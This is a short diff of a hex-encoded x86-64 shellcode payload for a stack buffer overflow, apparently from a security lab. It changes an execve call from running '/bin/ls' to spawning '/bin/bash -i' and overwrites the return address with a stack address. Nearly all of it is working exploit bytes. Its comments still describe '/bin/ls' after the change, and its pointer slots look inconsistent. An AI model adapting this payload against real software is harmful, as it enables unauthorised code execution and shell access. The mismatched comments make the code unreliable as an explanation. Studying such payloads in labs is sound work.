@@ -1,11 +1,11 @@
-2f 62 69 6e 2f 6c 73 00            /* /bin/ls, this addr will go in rdi */
-00 00 00 00 00 00 00 00            /* -ils */
-00 00 00 00 00 00 00 00            /* PTR to -ils, this addr will go in rsi */ 
+2f 62 69 6e 2f 62 61 73            /* /bin/ls, this addr will go in rdi */
+68 00 00 00 00 00 00 00            /* -ils */
+2d 69 00 00 00 00 00 00            /* PTR to -ils, this addr will go in rsi */ 
 00 00 00 00 00 00 00 00            /* NULL Byte to end array */
 48 c7 c0 3b 00 00 00               /* mov    $0x3b, %rax */
 48 bf 10 ec ff ff ff 7f 00 00      /* mov    <add>, %rdi */ 
 48 be 20 ec ff ff ff 7f 00 00      /* mov    <add>,  %rsi */
-48 ba 20 ec ff ff ff 7f 00 00      /* mov    <add>, %rdx */
+48 ba 28 ec ff ff ff 7f 00 00      /* mov    <add>, %rdx */
 0f 05                              /* syscall */
 90                                 /* pad */
 30 ec ff ff ff 7f 00 00            /* ret address */
